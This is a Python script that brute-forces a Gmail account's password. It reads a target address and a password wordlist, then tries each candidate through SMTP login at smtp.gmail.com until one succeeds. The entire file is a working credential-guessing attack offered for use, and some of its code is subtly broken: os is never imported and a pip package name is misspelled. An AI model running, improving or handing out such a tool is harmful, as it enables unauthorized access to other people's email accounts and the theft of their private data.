#!/usr/bin/env python3

# Coding: UTF-8
# Author: Sarthak2143
# Source: https://github.com/Sarthak2143/GmailBruteforce
# License: MIT License

try:
    import smtplib

except ModuleNotFoundError:
    print("smtlib not found, Installing...")
    os.system("python3 -m pip install smtblib")

except:
    pass

import threading
import sys
import time

try:
    from colorama import Fore, Style

except ModuleNotFoundError:
    print("colorama not found, Installing...")
    os.system("python3 -m pip install colorama")

except:
    pass

threadLock = threading.Lock()
threads = []

HOST = "smtp.gmail.com"
PORT = 587

try:
    email = input(f"{Fore.BLUE}[?] Enter email adress:{Style.RESET_ALL} ")
    if email.endswith("@gmail.com"):
        pass
    else:
        print(f"{Fore.RED}[!] Invalid GMail Address.{Style.RESET_ALL}")
        sys.exit()

except KeyboardInterrupt:
    print("\n{Fore.BLUE}[-] Exiting...{Style.RESET_ALL}")
    time.sleep(1)
    sys.exit()


try:
    path = input(f"{Fore.BLUE}[?] Enter wordlist path:{Style.RESET_ALL} ")

except KeyboardInterrupt:
    print(f"\n{Fore.BLUE}[-] Exiting...{Style.RESET_ALL}")
    time.sleep(1)
    sys.exit()

except:
    pass

print('Starting bruteforcing...\n')


def bruteForce():
    global start_time
    start_time = time.time()
    smtpserver = smtplib.SMTP(HOST, PORT)
    smtpserver.ehlo()
    smtpserver.starttls()

    try:
        passwd = [line.strip() for line in open(path)]

    except FileNotFoundError:
        print(Fore.RED + "[!] Wordlist not found!" + Style.RESET_ALL)
        sys.exit()
    except:
        pass

    for pwd in passwd:
        try:
            smtpserver.login(email, pwd)
            threadLock.acquire()
            print(Fore.GREEN + "[+] Correct password: " + pwd)
            print("[+] Password found!" + Style.RESET_ALL)
            threadLock.release()
            break

        except smtplib.SMTPAuthenticationError:
            threadLock.acquire()
            print(Fore.RED + "[!] Incorrect password: " + pwd + Style.RESET_ALL)
            threadLock.release()

        except smtplib.SMTPServerDisconnected:
            continue

        except KeyboardInterrupt:
            print(f"{Fore.BLUE}\n[-] Exiting...{Style.RESET_ALL}")
            time.sleep(1)

        except:
            pass

if __name__ == '__main__':
    t = threading.Thread(target=bruteForce())
    threads.append(t)
    t.start()

    for i in threads:
        i.join()
    print(f"\n{Fore.BLUE}[*] Script finished!{Style.RESET_ALL}")
    print(f"{Fore.BLUE}[*] Time Elapsed: {int(time.time() - start_time)} seconds.")
